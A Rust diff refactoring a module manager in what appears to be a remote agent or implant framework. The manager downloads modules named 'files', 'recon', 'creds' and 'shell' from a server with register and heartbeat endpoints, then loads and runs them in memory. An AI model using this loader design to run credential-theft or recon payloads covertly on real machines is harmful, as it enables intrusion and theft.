@@ -1,3 +1,6 @@
+//! 内嵌模块管理器（从 libra-engine::module_manager 搬迁）：WS 消息处理中
+//! 需要下载 files/recon/creds 等模块时使用，独立于 agent 本体的管理器。
+
 use std::collections::HashMap;
 
 use libra_comm::http::HttpCommunicator;
@@ -5,8 +8,6 @@ use libra_load::{load_module, LoadedModule, ModuleMainFn};
 
 const MODULE_OUTPUT_CAP: usize = 16 * 1024 * 1024; // 16 MB per module result
 
-/// Cloud module loader — downloads, loads in memory, and invokes modules on
-/// demand. Only the modules actually used by a session are ever downloaded.
 pub struct ModuleManager {
     http: HttpCommunicator,
     agent_id: String,
@@ -36,10 +37,6 @@ impl ModuleManager {
         }
     }
 
-    pub fn is_loaded(&self, name: &str) -> bool {
-        self.loaded.contains_key(name)
-    }
-
     /// Download and in-memory load a module if not already loaded.
     async fn ensure_loaded(&mut self, name: &str) -> Result<(), String> {
         if self.loaded.contains_key(name) {
@@ -56,11 +53,7 @@ impl ModuleManager {
             .await?;
         let module = load_module(&bytes, "module_main")?;
 
-        // Self-identification check: the downloaded artifact must claim to be
-        // the requested module, otherwise a corrupted/mismatched download
-        // would execute under the wrong name.
         if !module.name.is_empty() && module.name != name {
-            libra_common::dlog!("[module] MISMATCH: requested '{name}', downloaded '{0}'", module.name);
             return Err(format!(
                 "module content mismatch: requested '{name}', downloaded '{}'",
                 module.name
@@ -71,16 +64,8 @@ impl ModuleManager {
         Ok(())
     }
 
-    /// Invoke a module by name with a JSON input, returning its JSON output.
-    pub async fn run(&mut self, name: &str, input: &str) -> Result<String, String> {
-        let (main, input) = self.prepare(name, input).await?;
-        execute_module(main, &input).await
-    }
-
     /// Download/load a module and resolve its entry point, returning the entry
-    /// plus the owned input. The caller must NOT hold `&mut self` (or the
-    /// module manager lock) while executing, so concurrent tasks can run
-    /// different modules in parallel instead of serializing on the loader.
+    /// plus the owned input. Caller must NOT hold `&mut self` while executing.
     pub async fn prepare(&mut self, name: &str, input: &str) -> Result<(ModuleMainFn, String), String> {
         self.ensure_loaded(name).await?;
         let main = self
@@ -92,9 +77,7 @@ impl ModuleManager {
     }
 }
 
-/// Execute a resolved module entry point on the blocking pool. No module
-/// manager lock is held here, so independent tasks run their modules in
-/// parallel.
+/// Execute a resolved module entry point on the blocking pool (module runtime).
 pub async fn execute_module(main: ModuleMainFn, input: &str) -> Result<String, String> {
     let input = input.to_string();
     tokio::task::spawn_blocking(move || {
@@ -127,24 +110,5 @@ pub async fn run_module(
     match execute_module(prepared.0, &prepared.1).await {
         Ok(r) => r,
         Err(e) => serde_json::json!({ "error": e }).to_string(),
-    }
-}
-
-#[cfg(test)]
-mod tests {
-    use super::*;
-
-    #[test]
-    fn new_manager_starts_with_nothing_loaded() {
-        let mgr = ModuleManager::new(
-            "http://127.0.0.1:1",
-            "/register",
-            "/heartbeat",
-            "/result",
-            "agent-1".to_string(),
-            None,
-            None,
-        );
-        assert!(!mgr.is_loaded("shell"));
     }
 }
